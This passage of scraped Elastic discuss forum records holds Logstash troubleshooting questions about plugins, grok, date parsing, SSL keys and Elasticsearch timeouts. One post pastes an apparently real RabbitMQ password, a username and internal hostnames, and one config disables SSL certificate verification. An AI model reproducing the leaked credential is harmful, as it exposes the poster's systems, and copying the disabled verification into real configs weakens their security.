    "body": "Hello team, I am very new to to ELK stack and this is my first task which I am trying to do: I am not understand a part of Http Input Plugin documentation here: https://www.elastic.co/blog/introducing-logstash-input-http-plugin http { host => \"127.0.0.1\" # default: 0.0.0.0 port => 31311 # default: 8080 } } Question 1: What is the host? Is the host where the request is coming from? Question 2: What is the REST URL I have to call if I am calling this plugin from another application. My LogStash is currently sitting on a windows server. Documentation mentions: curl -XPUT 'http://127.0.0.1:8080/twitter/tweet/1' -d 'hello' this would work, and it works if I use this command from the server powershell. Which REST API to call if I am calling it from outside of my LogStash server. I am very confused about it, any help would be appreciated. Thank you, Karanbir",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "cea45c39-4a9b-4a1f-a3e7-e96967263835",
    "url": "https://discuss.elastic.co/t/read-mode-vs-tail-mode/229343",
    "title": "Read mode vs tail mode",
    "category": [
      "Logstash"
    ],
    "author": "Claudio_Ract_Costa",
    "date": "April 22, 2020, 7:22pm",
    "body": "Hi, I'm processing files that comes from an external server each minute; so once copied, files are static and no new content will be added into the file. I am reading the files in tail mode but I've experienced some issues processing some lines of the files ( are not being ingested into ES.) My input configuration is: input { file { path => \"/fwdata/PCRF/EDR/output/dcr/RTC*\" } } In this directory \"/fwdata/PCRF/EDR/output/dcr/\" there are hundred files and, after the end of the day (around 00:00 am), a script move these files to other directory. Well, I would like to know if in this scenario I descrived above: Is tail mode the correct way to ingest all line within a file to ES ? If yes, my input configuration is correct ? Is possible to undertstand why some lines are not being ingested into ES ? Or read mode is the correct way ? If yes, can show me how would be the input configuration ?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "64e0be2a-c0e6-4710-8f8b-fbefcc08e2fb",
    "url": "https://discuss.elastic.co/t/s3-output-plugin-losing-logs/229319",
    "title": "S3 Output Plugin losing logs",
    "category": [
      "Logstash"
    ],
    "author": "sera",
    "date": "April 22, 2020, 4:49pm April 22, 2020, 6:57pm",
    "body": "Hi, With a very basic pipeline (with a single busy device sending syslog to Logstash) and output to S3, I am losing most (but not all) of the log files. In S3 I see only the occasional part file from the sequence. My config looks like this: input { tcp { port => 10514 type => syslog } udp { port => 10514 type => syslog } } output { s3{ access_key_id => \"hidden\" secret_access_key => \"hidden\" region => \"eu-west-1\" bucket => \"bucket1\" canned_acl => \"bucket-owner-full-control\" temporary_directory => \"/var/log/s3tmp\" size_file => 4096 time_file => 15 server_side_encryption => true codec => \"json_lines\" proxy_uri => \"http://10.10.10.3:8080/\" } } Watching the Logstash server's filesystem I see all the temp files being created and disappearing, but hardly any of them make it to S3. The part files which do arrive in S3 look correct. I have tried experimenting with a wide range of settings for size_file and time_file, but always end with with loads of files missing from S3. Any idea please? Many thanks, Sera",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ecda5667-1a38-4468-afcb-bb0d6d5155c0",
    "url": "https://discuss.elastic.co/t/logstash-slow/228858",
    "title": "Logstash slow",
    "category": [
      "Logstash"
    ],
    "author": "adwaitjoshi",
    "date": "April 20, 2020, 3:04pm April 20, 2020, 6:15pm April 20, 2020, 8:37pm April 20, 2020, 8:38pm April 20, 2020, 8:45pm April 20, 2020, 9:04pm April 22, 2020, 6:37pm",
    "body": "I am missing a setting or two on logstash I am sure but don't know which. My elastic cluster typically indexes at about 12000 docs/sec. I have Logstash pulling from kafka and sensing to Elastic. Seeing speeds of 250/sec. I have 8 partitions in Kafka My pipeline.workers: 8 My pipeline.batch.size: 5000 jvm has 16GB of Ram. I am using SSDs, there is no way its this slow. Something is happening. What am I missing? Thanks in advance!",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "8e8cc99b-1590-4865-b934-333fca6315ef",
    "url": "https://discuss.elastic.co/t/geo-point-not-indexed-in-array-format/229334",
    "title": "Geo_point not indexed in Array format",
    "category": [
      "Logstash"
    ],
    "author": "Jalil",
    "date": "April 22, 2020, 6:18pm",
    "body": "Hi all, I'm using logstash to index mongodb documents into ES. every thing goes well but the location object is not indexed. I defined a template mapping as geo_point as follow : \"arrival_in\": { \"ignore_malformed\": true, \"type\": \"geo_point\", \"ignore_z_value\": true }, Here is the array object I want to index : {... \"arrival_in\" : [ 10.1039266666667, 33.889845 ], ... } nothing indexed in ES, but when I try to insert manually with dev console, every thing OK. Could you help please. Jalil",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3b06ddd8-583b-4bb2-859a-c66619ee6703",
    "url": "https://discuss.elastic.co/t/time-format-30-12-2019-1400-gmt-00-00/229256",
    "title": "Time format 30.12.2019 14:06:00 GMT+00:00",
    "category": [
      "Logstash"
    ],
    "author": "Yaniv_Nuriel",
    "date": "April 22, 2020, 12:30pm April 22, 2020, 3:32pm April 22, 2020, 4:03pm April 22, 2020, 5:29pm",
    "body": "Dear all, Any idea how to match the following date format? 30.12.2019 14:06:00 GMT+00:100 This is not working dd.MM.yyy HH:mm:ss zzz",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b20b15a2-d59f-48bf-8c05-5d32c690b95b",
    "url": "https://discuss.elastic.co/t/calculate-time-difference-between-2-lines-in-log-file-if-there-are-multiple-sets/228856",
    "title": "Calculate time difference between 2 lines in log file if there are multiple sets",
    "category": [
      "Logstash"
    ],
    "author": "airan",
    "date": "April 20, 2020, 12:00pm April 20, 2020, 3:11pm April 22, 2020, 4:25pm April 22, 2020, 4:38pm",
    "body": "Hi everyone, I retrieved a log file that look like this : 2019-03-07 04:35:57.421 19EC | INFO TIMEDATA.DLL: Capacity allocated: Hashtable entries 20648881, Heap mem 805306368 2019-03-07 04:35:57.421 19EC | INFO DPREAD: Data import started: 07.03.19 04:35:57 2019-03-07 04:35:57.421 19EC | INFO DPREAD: Importing file: C:\\path\\to\\file1 2019-03-07 04:35:57.452 19EC | INFO DPREAD: Completed importing file: C:\\path\\to\\file1 2019-03-07 04:35:57.452 19EC | INFO DPREAD: Importing file: C:\\path\\to\\file2 2019-03-07 04:36:43.545 19EC | INFO DPREAD: Completed importing file: C:\\path\\to\\file2 2019-03-07 05:38:55.332 19EC | INFO TMDPDATA-INIT: Datasupply info: vwdpm.dcsDefault.2.0 2019-03-07 06:40:50.421 19EC | INFO DPREAD: Importing file: C:\\path\\to\\file1 2019-03-07 06:40:55.452 19EC | INFO DPREAD: Completed importing file: C:\\path\\to\\file1 What i want to do is to calculate the difference between the time of \"Importing file: C:\\path\\to\\file1\" and \"Completed importing file: C:\\path\\to\\file1\". There are 2 sets matching this criteria in the log file and I want Elapsed time for both sets. I used Logstash filter (aggregate and elapsed) but able to retrieve time only for 1 set. Could someone help me on this?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "cdfa8246-c5b6-4e1b-b54d-0bc4c093721b",
    "url": "https://discuss.elastic.co/t/logstash-input-beats-file-does-not-contain-valid-private-key/228140",
    "title": "Logstash-input-beats - File does not contain valid private key",
    "category": [
      "Logstash"
    ],
    "author": "Kuaaaly",
    "date": "April 15, 2020, 3:04pm April 15, 2020, 3:03pm April 16, 2020, 7:28am April 16, 2020, 7:57pm April 16, 2020, 8:21pm April 17, 2020, 7:46pm April 20, 2020, 12:30pm April 21, 2020, 6:01pm April 22, 2020, 11:19am April 22, 2020, 11:44am April 22, 2020, 12:01pm April 22, 2020, 1:41pm April 22, 2020, 3:52pm April 22, 2020, 4:33pm",
    "body": "Hi there, I am currently doing a stack upgrade from 7.0.1 to 7.6.2. Everything went fine on the Elasticsearch cluster and Kibana instances but I have issues upgrading Logstash. To be precise, Logstash upgrade was fine, the issue I have is located in a pipeline and precisely in a Beats input (so logstash-input-beats). The problem seems to be located in the ssl_key param of the beats input. The following error is popping up in Logtash logs: [2020-04-15T14:07:44,572][ERROR][logstash.javapipeline ] Pipeline aborted due to error {:pipeline_id=>\"mon_collector\", :exception=>java.lang.IllegalArgumentException: File does not contain valid private key: /etc/pki/local/my-host.key.pem, :backtrace=>[\"io.netty.handler.ssl.SslContextBuilder.keyManager(io/netty/handler/ssl/SslContextBuilder.java:270)\", \"io.netty.handler.ssl.SslContextBuilder.forServer(io/netty/handler/ssl/SslContextBuilder.java:90)\", \"org.logstash.netty.SslContextBuilder.buildContext(org/logstash/netty/SslContextBuilder.java:104)\", \"java.lang.reflect.Method.invoke(java/lang/reflect/Method.java:498)\" What is strange is that everything was working fine with Logstash 7.0.1 and I did not change anything to the configuration / pipeline configuration during the upgrade. Moreover, I tried to rollback on 7.0.1 it worked fine again, I also tried version 7.4.2, 7.5.2, it is working fine too... The breaking point seems to be version 7.6.x (I tried 7.6.1, 7.6.2, both output the error and the pipeline does not start). I did not try 7.6.0 but I think it will be the same... I searched a lot (here, GitHub, StackOverflow, googling) and tried about everything I found: File permission (including changing owner to Logstash) Ensure private key format is correct (by the way a copy of the same private key is used by Elasticsearch on this host and is currently working with 7.6.2) Generate a new key At this point, I believe this is a specific issue regarding 7.6.x version(s), and since I did not find any recent post this might be the case (7.6.x are recent versions at the time I'm writing this). Again, what is really strange is that 7.6 upgrade seems to break things. I have seen in release notes that there were some changes around SSL things (like netty) recently and may be it is related. So here is my main question: while upgrading from 7.0.1 (or 7.5.2) to 7.6.2, am I supposed to do anything particular on the SSL settings? Thank you in advance for your help, Kuaaaly",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "53dc4a2b-6922-42d7-96ff-31fba70ef7fa",
    "url": "https://discuss.elastic.co/t/new-pipelines-are-not-loaded-correctly/229305",
    "title": "New pipelines are not loaded correctly",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 22, 2020, 4:27pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "adf5141a-0303-4e80-be97-1bad7594d882",
    "url": "https://discuss.elastic.co/t/how-can-i-send-logs-to-logstash-with-no-authentication/229297",
    "title": "How can I send logs to Logstash with no authentication?",
    "category": [
      "Logstash"
    ],
    "author": "FREDDIE2020",
    "date": "April 22, 2020, 3:16pm April 22, 2020, 3:43pm April 22, 2020, 4:13pm",
    "body": "Hello All, Need to know how I can send logs to Logstash with no authentication? Is this possible and if so, what is process? Any help appreciated. Thanks, FREDDIE2020",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "14145eeb-d9fa-4fc5-882e-9ef87ad59dc6",
    "url": "https://discuss.elastic.co/t/timeout-waiting-for-connection-from-pool-from-http-poller-plugin/229014",
    "title": "\"Timeout waiting for connection from pool\" from http_poller plugin",
    "category": [
      "Logstash"
    ],
    "author": "fr3eze",
    "date": "April 21, 2020, 10:34am April 21, 2020, 3:24pm April 22, 2020, 1:20am April 22, 2020, 3:41pm",
    "body": "I have a single logstash configuration with single http_poller plugin, and a lot of URL stacked inside: input { http_poller { urls => { A => { method => get url => \"https://xxx.xxx\" headers => { Accept => \"application/json\" } } B => { method => get url => \"https://xxx.xxx\" headers => { Accept => \"application/json\" } } C => { method => get url => \"https://xxx.xxx\" headers => { Accept => \"application/json\" } } ..... request_timeout => 1800 socket_timeout => 1800 schedule => { cron => \"0 * * * * UTC\"} codec => \"json\" tags => application_api } } filter { json { source => \"message\" add_field => { \"Client\" => \"%{[devDetails][hdrTitle]}\" } remove_field => [ \"%{[devDetails][Type]}\" ] } split { field => \"[result]\"} bytes { source => \"[result][volume]\" target => \"bytes_numeric_field\" } mutate { add_field => { \"Application\" => \"%{[result][Name]}\" \"ApplicationVolume\" => \"%{[bytes_numeric_field]}\" } } mutate { convert => {\"ApplicationVolume\" => \"integer\"} remove_field => [ \"[result]\" ] } } output { elasticsearch { hosts => [\"vpc-xxx:80\"] manage_template => false index => \"hourly_-%{+YYYY.MM}\" } } As you can see I have A B C stacked under the urls block. I tested it was working fine with less than 10 urls defined. Nowadays i just increased it to more than 100, and I start to see error logs like: [2020-04-21T17:48:28,674][DEBUG][logstash.pipeline ] filter received {\"event\"=>{\"@version\"=>\"1\", \"http_request_failure\"=>{\"request\"=>{\"url\"=>\"https://xxx.xxx\", \"method\"=>\"get\", \"headers\"=> {\"Accept\"=>\"application/json\"}}, \"error\"=>\"Timeout waiting for connection from pool\", \"name\"=>\"td_xxx_xxx\", \"runtime_seconds\"=>316.753646, \"backtrace\"=>nil}, \"@timestamp\"=>2020-04-18T15:12:10.086Z, \"tags\"=>[\"_http_request_failure\"]}} And [2020-04-21T17:52:43,187][DEBUG][logstash.pipeline ] filter received {\"event\"=> {\"@version\"=>\"1\", \"http_request_failure\"=>{\"error\"=>\"SSL peer shut down incorrectly\", \"runtime_seconds\"=>382.350346, \"name\"=>\"scc\", \"request\"=>{\"url\"=>\"https://xxx.xxx\", \"headers\"=> {\"Accept\"=>\"application/json\"}, \"method\"=>\"get\"}, \"backtrace\"=>nil}, \"tags\"=> [\"_http_request_failure\"], \"@timestamp\"=>2020-04-18T20:06:40.568Z}} I've increased the request_timeout and socket_timeout to 1800 but seems like it does ot help much.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "86b314aa-9475-43be-a8bb-1bcf1950ab0c",
    "url": "https://discuss.elastic.co/t/logstash-grok-ignore-field-if-unavailable/229159",
    "title": "Logstash grok ignore field if unavailable",
    "category": [
      "Logstash"
    ],
    "author": "Chandra12",
    "date": "April 22, 2020, 2:13am April 22, 2020, 3:38pm",
    "body": "Hi, I'm trying to skip field if any of below field is missing I couldn't to parse VD=73,IP=10.4.1.1,M1=1586,M2=158,TB=Mobile, Grok expression for above VD=%{NUMBER:VD},IP=%{IPV4:ipaddress},M1=%{NUMBER:m1},M2=%{NUMBER:m2},TB=%{DATA:tt}, Lets Say If VD is missing It has to parse by skipping field, I looking for universal pattern that parses even if any field is missing . Any idea would be helpful thank you",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2744dcd4-6e5c-4fea-b441-9371da201d01",
    "url": "https://discuss.elastic.co/t/logstash-conf/228972",
    "title": "Logstash conf",
    "category": [
      "Logstash"
    ],
    "author": "Cheruku125",
    "date": "April 21, 2020, 6:26am April 21, 2020, 6:44am April 21, 2020, 8:36am April 21, 2020, 3:27pm April 22, 2020, 2:53am April 22, 2020, 3:36pm",
    "body": "Failed to execute action {:action=>LogStash::PipelineAction::Create/pipeline_id:main, :exception=>\"LogStash::ConfigurationError\", :message=>\"Expected one of #, {, } at line 8, column 97 (byte 388) after input {\\n jdbc {\\n jdbc_driver_library => \"/home/elkadmin/Desktop/spdatabase/jdbc.jar\"\\n jdbc_driver_class => \"com.mysql.jdbc.Driver\"\\n jdbc_connection_string => \"jdbc:mysql://localhost:3306/identityiq?zeroDateTimeBehavior=convertToNull\"\\n jdbc_user =>\"root\"\\n jdbc_password => \"\"\\n statement => \"select concat('CITY = ',ExtractValue(attributes, '/Attributes/Map/entry[@key=\"\", :backtrace=>[\"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:41:in compile_imperative'\", \"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:49:in compile_graph'\", \"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:11:in block in compile_sources'\", \"org/jruby/RubyArray.java:2577:in map'\", \"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:10:in compile_sources'\", \"org/logstash/execution/AbstractPipelineExt.java:151:in initialize'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline.rb:22:in initialize'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline.rb:90:in initialize'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline_action/create.rb:43:in block in execute'\", \"/usr/share/logstash/logstash-core/lib/logstash/agent.rb:96:in block in exclusive'\", \"org/jruby/ext/thread/Mutex.java:165:in synchronize'\", \"/usr/share/logstash/logstash-core/lib/logstash/agent.rb:96:in exclusive'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline_action/create.rb:39:in execute'\", \"/usr/share/logstash/logstash-core/lib/logstash/agent.rb:334:in block in converge_state'\"]} [2020-04-21T11:42:56,632][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9600} [2020-04-21T11:43:01,132][INFO ][logstash.runner ] Logstash shut down.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "d234252d-80e0-4923-89e6-96f4216a6a54",
    "url": "https://discuss.elastic.co/t/is-it-possible-to-impose-order-for-the-input-files/229255",
    "title": "Is it possible to impose order for the input files?",
    "category": [
      "Logstash"
    ],
    "author": "mnrdammu",
    "date": "April 22, 2020, 12:15pm April 22, 2020, 3:33pm",
    "body": "Hi All, I have a usecase, where I have to read two files (csv and txt) , using two file inputs. Then in the filter section, I need to do some filtering on the contents of csv file, based on the field derived from txt file. This seems to work fine in terms of , reading and when there is update in the contents of the files, it capture the changes. However, every time when I run logstash command, the csv file is read before the txt file and so my logic for filtering in the filter section is skipped. I was wondering if there is a way to set order to the input files or force the csv file read to wait for the txt file read to start. Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c0cc0e80-aa75-4b57-8d28-162e5d1d926b",
    "url": "https://discuss.elastic.co/t/flattening-array-and-dynamically-create-the-field-name/229268",
    "title": "Flattening array and dynamically create the field name",
    "category": [
      "Logstash"
    ],
    "author": "manto",
    "date": "April 22, 2020, 1:03pm April 22, 2020, 3:31pm",
    "body": "Hello, I have an JSON array input below: \"coverageStats\": [ { \"label\": \"Branches\", \"position\": 6, \"total\": 30, \"covered\": 17, \"isDeltaAvailable\": false, \"delta\": 0.0 }, { \"label\": \"Lines\", \"position\": 4, \"total\": 492, \"covered\": 117, \"isDeltaAvailable\": false, \"delta\": 0.0 } ] and I would like to create something like this with a ruby filter: Desired output: \"Branches\" : { \"label\": \"Branches\" \"position\": 6, \"total\": 30, \"covered\": 17, \"isDeltaAvailable\": false, \"delta\": 0.0 }, \"Lines\" : { \"label\": \"Lines\", \"position\": 4, \"total\": 492, \"covered\": 117, \"isDeltaAvailable\": false, \"delta\": 0.0 } Basically, I would like to iterate the array and take the \"label\" value and set it as a key in my new structured dictionary. By doing this, it would make easier to display the event in Kibana. Any help would be appreciated. Thank you.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8c522274-c8fa-4aa6-a3b0-bc56d6857c0c",
    "url": "https://discuss.elastic.co/t/elasticsearch-output-plugin-cloud-id-property/229275",
    "title": "Elasticsearch output plugin cloud_id property",
    "category": [
      "Logstash"
    ],
    "author": "Alex_Nikolis",
    "date": "April 22, 2020, 1:46pm April 22, 2020, 3:24pm",
    "body": "A cloud_id property is documented on the elastisearch output plugin, but when trying to set it, I receive an error that the property is invalid. Am I missing something? https://www.elastic.co/guide/en/logstash/current/plugins-outputs-elasticsearch.html#plugins-outputs-elasticsearch-cloud_id Logstash: v7.5.2 logstash-output-elasticsearch (10.2.3)",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b2f2ac1f-1518-4f29-94d2-29b17de04497",
    "url": "https://discuss.elastic.co/t/logstash-filter-based-on-first-line-as-identifier/229282",
    "title": "Logstash filter based on first line as identifier",
    "category": [
      "Logstash"
    ],
    "author": "prkd",
    "date": "April 22, 2020, 2:40pm April 22, 2020, 3:16pm",
    "body": "I am using a light weight python based forwarder (github) instead of filebeat due to an old Solaris version dependency on the server sending the files. I am unable to add fields like we can do in filebeat using this forwarder. My logstash config needs some information to understand what type of data it is receiving based on which it applies a CSV filter and indexes the data. On other Linux based platform's data I've achieved this by reading the field values as defined on filebeat config. Eg.if [fields][fieldname] == \"xyz\" which I cant use for the python based forwarder. As a solution I was looking for a way to use the first line of the file as an identifier to make the decision that logstash needs. This is a new file which is going to get freshly prepared every hour and should have the identifier on the first line each time. I want logstash to be able to understand what type of data it is by looking at the data and use the corresponding CSV filter. Something of this sort: filter { if (line_1 == type_1) { csv {...} } else if (line_1 == type_2) { csv {...} } } Is this something possible? Thank You.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b8ad67ca-c31f-4694-9f4f-045a0c008522",
    "url": "https://discuss.elastic.co/t/logstash-connecting-to-es-instance-on-localhost-instead-of-physical-ip/229232",
    "title": "Logstash connecting to ES instance on localhost instead of physical IP",
    "category": [
      "Logstash"
    ],
    "author": "cnvramana",
    "date": "April 22, 2020, 10:41am April 22, 2020, 11:01am April 22, 2020, 12:54pm",
    "body": "I have installed ELK stack 7.6 on a single server. This is on a trial run I set up ElasticSearch, Logstash, and Kibana to run on physical IP instead of locahost. I am able to reach all three components with the IP address on respective ports from browser and curl ES -->Curl \"http://x.x.x.x/:9200\" Logstash --> curl \"http://x.x.x.x:9600\" Kibana --> curl \"http://x.x.x.x:5601\" However, Logstash by default is trying to reach elasticsearch instance on localhost:9200 instead of IP address (\"http://x.x.x.x/:9200\"). Where should i change in logstash so that it looks to check on the physical IP(\"http://x.x.x.x/:9200\") for ES instance instead of localhost:9200",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "62775a7c-3543-4d3b-b080-706c62c31172",
    "url": "https://discuss.elastic.co/t/azureblob-input-plugin-error/229088",
    "title": "Azureblob input plugin - error",
    "category": [
      "Logstash"
    ],
    "author": "Kevin_f",
    "date": "April 22, 2020, 9:14am April 21, 2020, 6:38pm April 21, 2020, 9:28pm April 21, 2020, 9:36pm April 22, 2020, 9:12am",
    "body": "Hello, Hoping that someone within the community has come across this issue we are facing and may have managed to resolve it or have any idea? Basically we have installed the azureblob plugin (0.9.13) to ingest logs from azure blob. Our logstash is on version 6.8.6-1 Our input and output config is as follows: input { azureblob { storage_account_name => \"storage_name\" storage_access_key => \"storage_key\" container => \"storage_container_name\" add_field => { \"service\" => \"blob\" } tags => [ 'azure' ] codec => \"json\" } } output { if [service] == \"blob\" and \"azure\" in [tags] { elasticsearch { user => \"elastic_user\" password => \"password\" hosts => [\"elasticsearch:9200\"] cacert => '/etc/logstash/certs/ca.crt' index => \"logstash-blob-v2-%{+xxxx.ww}\" ssl => true ssl_certificate_verification => false } } } The error we are seeing in the logstash logs are: [ERROR][logstash.pipeline] Pipeline aborted due to error {:pipeline_id=>\"main\", :exception=>#<NoMethodError: undefined method ` version' for nil:NilClass>, :backtrace=>[\"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-azureblob-0.9.13-java/lib/logstash/inputs/azureblob.rb:135:in `register'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline.rb:259:in ` register_plugin'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline.rb:270:in `block in register_plugins'\", \"org/jruby/RubyArray.java:1792:in ` each'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline.rb:270:in `register_plugins'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline.rb:413:in ` start_inputs'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline.rb:311:in `start_workers'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline.rb:217:in ` run'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline.rb:176:in `block in start'\"], :thread=>\"#<Thread:0x86fc3c5 run>\"} Your help would be much appreciated. Many thanks. Regards, Kevin",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c8b457ff-d64f-41fb-9cf2-44d5b3ce3e94",
    "url": "https://discuss.elastic.co/t/logstash-outputs-elasticsearch-marking-url-as-dead-elasticsearch-unreachable-manticore-sockettimeout-read-timed-out-logstash-hostunreachableerror/227059",
    "title": "[logstash.outputs.elasticsearch] Marking url as dead. Elasticsearch Unreachable: [Manticore::SocketTimeout] Read timed out. LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError",
    "category": [
      "Logstash"
    ],
    "author": "m_vibin",
    "date": "April 8, 2020, 6:50am April 15, 2020, 7:29am April 22, 2020, 7:39am",
    "body": "Hello Team, We built a new Elastic cluster with 3 masters and 2 data nodes with 2 logstash nodes. On the logstash nodes, we are seeing these errors when pushing the logs. It disconnects from the Elastic cluster and connects back within seconds but happens every now and then. Please see the logstash configuration and errors. # cat filter.conf filter { if [headers][http_version] { drop{} } if [apic_cloud] { mutate { add_field => [ \"[@metadata][index_type]\", \"apic\" ] } } else { mutate { add_field => [ \"[@metadata][index_type]\", \"dp\" ] } } } # cat input_rabbitmq.conf input { rabbitmq { queue => \"apic\" host => [\"88535.d.net\", \"88534.d.net\", \"88537.d.net\", \"88536.d.net\"] exchange => \"syslogs\" durable => true user => \"dplogs\" password => \"JTu7Q7}M\" exchange_type => \"direct\" key => \"apic\" ack => true prefetch_count => 300 arguments => { \"x-queue-type\" => \"classic\" } } } output { elasticsearch { manage_template => false sniffing => false index => \"%{[@metadata][index_type]}-%{+YYYY.MM.dd}\" document_type => \"_doc\" cacert => \"/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem\" hosts => [\"https://93801.d.net:9200\", \"https://93806.d.net:9200\"] password => \"*************\" user => \"C013020\" } } [2020-04-08T00:54:55,889][WARN ][logstash.outputs.elasticsearch] Marking url as dead. Last error: [LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnr eachableError] Elasticsearch Unreachable: [https://C013020:xxxxxx@93806.d.net:9200/][Manticore::SocketTimeout] Read timed out {:url=>https://C013020: xxxxxx@93806.d.net:9200/, :error_message=>\"Elasticsearch Unreachable: [https://C013020:xxxxxx@93806.d.net:9200/][Manticore::SocketTimeout] R ead timed out\", :error_class=>\"LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError\"} [2020-04-08T00:54:55,890][ERROR][logstash.outputs.elasticsearch] Attempted to send a bulk request to elasticsearch' but Elasticsearch appears to be unreachabl e or down! {:error_message=>\"Elasticsearch Unreachable: [https://C013020:xxxxxx@93806.d.net:9200/][Manticore::SocketTimeout] Read timed out\", :class= >\"LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError\", :will_retry_in_seconds=>2} [2020-04-08T00:54:55,936][WARN ][logstash.outputs.elasticsearch] Restored connection to ES instance {:url=>\"https://C013020:xxxxxx@93806.d.net:9200/\" } [2020-04-08T00:54:56,162][WARN ][logstash.outputs.elasticsearch] Marking url as dead. Last error: [LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnr eachableError] Elasticsearch Unreachable: [https://C013020:xxxxxx@93801.d.net:9200/][Manticore::SocketTimeout] Read timed out {:url=>https://C013020: xxxxxx@93801.d.net:9200/, :error_message=>\"Elasticsearch Unreachable: [https://C013020:xxxxxx@93801.d.net:9200/][Manticore::SocketTimeout] R ead timed out\", :error_class=>\"LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError\"} [2020-04-08T00:54:56,162][ERROR][logstash.outputs.elasticsearch] Attempted to send a bulk request to elasticsearch' but Elasticsearch appears to be unreachabl e or down! {:error_message=>\"Elasticsearch Unreachable: [https://C013020:xxxxxx@93801.d.net:9200/][Manticore::SocketTimeout] Read timed out\", :class= >\"LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError\", :will_retry_in_seconds=>2} [2020-04-08T00:55:00,949][WARN ][logstash.outputs.elasticsearch] Restored connection to ES instance {:url=>\"https://C013020:xxxxxx@93801.d.net:9200/\" } The strange thing is there are no fixed intervals in which this happens, its quite random. Sometimes we see timed out errors on the elasticsearch nodes but not always. Not sure whether they are related. [2020-04-08T00:00:06,295][INFO ][o.e.c.m.MetaDataMappingService] [94977] [apic-2020.04.07/6EWlCFJbTDuaaVybBTePMw] update_mapping [_doc] [2020-04-08T00:44:43,051][ERROR][o.e.x.m.c.i.IndexRecoveryCollector] [94977] collector [index_recovery] timed out when collecting data [2020-04-08T00:44:53,052][ERROR][o.e.x.m.c.i.IndexStatsCollector] [94977] collector [index-stats] timed out when collecting data [2020-04-08T00:45:03,052][ERROR][o.e.x.m.c.c.ClusterStatsCollector] [94977] collector [cluster_stats] timed out when collecting data [2020-04-08T00:45:08,771][WARN ][o.e.c.InternalClusterInfoService] [94977] Failed to update node information for ClusterInfoUpdateJob within 15s timeout [2020-04-08T00:45:08,771][DEBUG][o.e.a.a.c.n.s.TransportNodesStatsAction] [94977] failed to execute on node [LisQzhzrRfWq4dmGBpJqzQ] org.elasticsearch.transport.ReceiveTimeoutTransportException: [93801][10.149.36.226:9300][cluster:monitor/nodes/stats[n]] request_id [325901] timed out after [15008ms] at org.elasticsearch.transport.TransportService$TimeoutHandler.run(TransportService.java:1016) [elasticsearch-6.8.3.jar:6.8.3] at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:681) [elasticsearch-6.8.3.jar:6.8.3] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [?:1.8.0_242] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [?:1.8.0_242] at java.lang.Thread.run(Thread.java:748) [?:1.8.0_242] [2020-04-08T00:45:23,053][ERROR][o.e.x.m.c.i.IndexRecoveryCollector] [94977] collector [index_recovery] timed out when collecting data [2020-04-08T00:45:23,772][WARN ][o.e.c.InternalClusterInfoService] [94977] Failed to update shard information for ClusterInfoUpdateJob within 15s timeout [2020-04-08T00:45:33,054][ERROR][o.e.x.m.c.i.IndexStatsCollector] [94977] collector [index-stats] timed out when collecting data [2020-04-08T00:45:43,054][ERROR][o.e.x.m.c.c.ClusterStatsCollector] [94977] collector [cluster_stats] timed out when collecting data [2020-04-08T00:45:51,337][WARN ][o.e.t.TransportService ] [94977] Received response for a request that has timed out, sent [57631ms] ago, timed out [42623m s] ago, action [cluster:monitor/nodes/stats[n]], node [{93801}{LisQzhzrRfWq4dmGBpJqzQ}{CLBgrXDlTwW5TDDs90sx0g}{10.149.36.226}{10.149.36.226:9300}{ml.machine_ memory=67386937344, ml.max_open_jobs=20, xpack.installed=true, ml.enabled=true}], id [325901] [2020-04-08T00:45:51,393][INFO ][o.e.c.m.MetaDataIndexTemplateService] [94977] adding template [.management-beats] for index patterns [.management-beats] [2020-04-08T00:45:51,402][INFO ][o.e.c.m.MetaDataIndexTemplateService] [94977] adding template [.management-beats] for index patterns 